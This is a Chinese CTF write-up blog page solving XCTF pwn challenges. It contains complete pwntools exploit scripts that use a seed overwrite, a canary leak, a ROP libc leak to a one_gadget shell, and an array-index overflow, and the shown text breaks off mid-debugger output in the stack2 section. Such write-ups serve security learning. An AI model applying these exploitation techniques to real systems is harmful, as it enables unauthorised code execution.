<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>攻防世界做题记录 | SkYe231 Blog</title><meta name="keywords" content="Writeup,攻防世界,xctf"><meta name="author" content="SkYe231"><meta name="copyright" content="SkYe231"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Pwndice_game 题目来源： XCTF 4th-QCTF-2018  考点：栈溢出、混合编程 基本情况程序实现的是一个具有用户姓名输入的菜随机数程序。 保护措施12345678910111213141516171819202122232425262728293031323334Arch:     amd64-64-littleRELRO:    Full RELROStack:    No">
<meta property="og:type" content="article">
<meta property="og:title" content="攻防世界做题记录">
<meta property="og:url" content="https://skyedai910.github.io/archives/20e728e/index.html">
<meta property="og:site_name" content="SkYe231 Blog">
<meta property="og:description" content="Pwndice_game 题目来源： XCTF 4th-QCTF-2018  考点：栈溢出、混合编程 基本情况程序实现的是一个具有用户姓名输入的菜随机数程序。 保护措施12345678910111213141516171819202122232425262728293031323334Arch:     amd64-64-littleRELRO:    Full RELROStack:    No">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://skyedai910.github.io/img/default_cover3.png">
<meta property="article:published_time" content="2020-04-20T14:18:00.000Z">
<meta property="article:modified_time" content="2021-03-26T08:54:32.439Z">
<meta property="article:author" content="SkYe231">
<meta property="article:tag" content="Writeup">
<meta property="article:tag" content="攻防世界">
<meta property="article:tag" content="xctf">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://skyedai910.github.io/img/default_cover3.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://skyedai910.github.io/archives/20e728e/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="cEoYWheDVkHH-Yp4JSBTTpaID2pIW7q58RgTg6h1iOs"/><meta name="baidu-site-verification" content="code-Xeczgxl48H"/><meta name="360-site-verification" content="95a7ddcc661de175b37bc99a62cf5c9e"/><meta name="yandex-verification" content="fc0ae24e23c94b47"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?8184ae9371af7cedfa47d27c247e16b8";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=UA-154693872-1"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'UA-154693872-1');
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"这篇文章距离上次更新已经","messageNext":"天，内容可能已经过时了。"},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":200,"languages":{"author":"作者: SkYe231","link":"链接: ","source":"来源: SkYe231 Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: true,
  isanchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-03-26 16:54:32'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const fontSizeVal = saveToLocal.get('global-font-size')
    if (fontSizeVal !== undefined) {
      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
    }
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="SkYe231 Blog" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">50</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">71</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 目录</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/default_cover3.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">SkYe231 Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 目录</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">攻防世界做题记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-04-20T14:18:00.000Z" title="发表于 2020-04-20 22:18:00">2020-04-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-03-26T08:54:32.439Z" title="更新于 2021-03-26 16:54:32">2021-03-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Writeup/">Writeup</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">7.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>37分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h3><blockquote>
<p>题目来源： XCTF 4th-QCTF-2018</p>
</blockquote>
<p><strong>考点：栈溢出、混合编程</strong></p>
<h4 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h4><p>程序实现的是一个具有用户姓名输入的菜随机数程序。</p>
<h5 id="保护措施"><a href="#保护措施" class="headerlink" title="保护措施"></a>保护措施</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">````</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#### 栈溢出</span></span></span><br><span class="line"></span><br><span class="line">一开始我在纠结是输入数字时使用的是**短整型**，可不可能是整型溢出，这样既能保持低位数字符合要求，又能控制 rip 跳转到后门。一时想不起来是那一条题和这条很相似的，就这样怀疑。</span><br><span class="line"></span><br><span class="line">最后观察是这里存在栈溢出：</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[55]; // [rsp+0h] [rbp-50h]</span><br><span class="line">  char v5; // [rsp+37h] [rbp-19h]</span><br><span class="line">  ssize_t v6; // [rsp+38h] [rbp-18h]</span><br><span class="line">  unsigned int seed[2]; // [rsp+40h] [rbp-10h]</span><br><span class="line">  unsigned int v8; // [rsp+4Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  memset(buf, 0, 0x30uLL);</span><br><span class="line">  *(_QWORD *)seed = time(0LL);                  // 随机种子</span><br><span class="line">  printf(&quot;Welcome, let me know your name: &quot;, a2);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  v6 = read(0, buf, 0x50uLL);//栈溢出</span><br><span class="line">  if ( v6 &lt;= 49 )                               // 字符长度小于等于49</span><br><span class="line">    buf[v6 - 1] = 0;                            // 最后一个字符替换为\x00</span><br><span class="line">  printf(&quot;Hi, %s. Let&#x27;s play a game.\n&quot;, buf);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  srand(seed[0]);</span><br><span class="line">…………</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是个小范围的栈溢出，可以覆盖随机数 seed 。做到这里发现和这条题目完全一样：[guess_num](# guess_num)。</p>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>固定随机数之后，就是 python c 的联合编程，用 <code>ctypes</code>实现。</p>
<p><code>rand</code>缺省种子参数时默认使用种子为：<code>0</code>。</p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;124.126.19.106&quot;</span>,<span class="number">45292</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./dice_game&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./dice_game&quot;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;skye&#x27;</span>.ljust(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>) + p64(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Give me the point&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(libc.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>[collapse title=”展开查看详情” status=”false”]</p>
<p><strong>考点：栈溢出，canary绕过</strong></p>
<h4 id="基本情况-1"><a href="#基本情况-1" class="headerlink" title="基本情况"></a>基本情况</h4><p>程序实现功能是往栈上读写数据。</p>
<h5 id="保护措施-1"><a href="#保护措施-1" class="headerlink" title="保护措施"></a>保护措施</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h5 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v3 = my_input();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        read(<span class="number">0</span>, &amp;s, <span class="number">0x100</span>uLL);                  <span class="comment">// 栈溢出</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>栈溢出空间还是比较大的。</p>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>使用栈溢出覆盖 canary 最后一字节，读取出 canary ，成功绕过 canary 保护。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak canary</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x89</span></span><br><span class="line">add(payload)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x89</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">canary = u64(<span class="string">&#x27;\x00&#x27;</span>+p.recv(<span class="number">7</span>))</span><br><span class="line">log.success(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br></pre></td></tr></table></figure>

<p>题目没有预留后门，并提供 libc ，所以泄露 libc 调用 onegadget getshell 。泄露 libc 需要借助输出函数，即需要控制 rip 调用。</p>
<p>泄露 libc 还需要 rop 回到 main 执行下一步操作。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(canary) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload += p64(start_addr)</span><br><span class="line">add(payload)</span><br><span class="line">leave()</span><br><span class="line">puts_leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;puts_leak:&quot;</span>+<span class="built_in">hex</span>(puts_leak))</span><br></pre></td></tr></table></figure>

<p>最后再次控制 rip 。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get shell</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(canary) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(onegadget)</span><br><span class="line">add(payload)</span><br><span class="line">leave()</span><br></pre></td></tr></table></figure>

<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./babystack&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;124.126.19.106&quot;</span>,<span class="number">51939</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./babystack&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">context</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.send(context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak canary</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x89</span></span><br><span class="line">add(payload)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x89</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">canary = u64(<span class="string">&#x27;\x00&#x27;</span>+p.recv(<span class="number">7</span>))</span><br><span class="line">log.success(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400a93</span></span><br><span class="line">start_addr = <span class="number">0x400720</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(canary) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload += p64(start_addr)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(payload)</span><br><span class="line">leave()</span><br><span class="line">puts_leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;puts_leak:&quot;</span>+<span class="built_in">hex</span>(puts_leak))</span><br><span class="line"></span><br><span class="line">libc_base = puts_leak - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">onegadget = libc_base + <span class="number">0x45216</span></span><br><span class="line">log.success(<span class="string">&quot;onegadget:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(canary) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(onegadget)</span><br><span class="line"></span><br><span class="line">add(payload)</span><br><span class="line">leave()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>[/collapse]</p>
<h3 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h3><blockquote>
<p>题目来源： XCTF 4th-QCTF-2018</p>
</blockquote>
<p>[collapse title=”展开查看详情” status=”false”]</p>
<p><strong>考点：数字下标溢出</strong></p>
<p>保护情况：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>漏洞函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;which number to change:&quot;</span>);          <span class="comment">// change</span></span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;index);	<span class="comment">//没有检查下标</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;new number:&quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line">num_list[index] = num;</span><br></pre></td></tr></table></figure>

<p>程序中找到有预留的后门函数，所以通过数组越界修改返回地址到后门。所以需要寻找 num_list 与 eip 的偏移。</p>
<p>寻找 eip 在栈上地址比较容易，将断点打在 main 退出前（0x080488EF），查看寄存器值：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0x0</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffcfa0 ◂— 0x1</span><br><span class="line"> EDX  0xf7fb887c (_IO_stdfile_0_lock) ◂— 0x0</span><br><span class="line"> EDI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> ESI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> EBP  0x0</span><br><span class="line"><span class="meta"> #</span><span class="bash"> 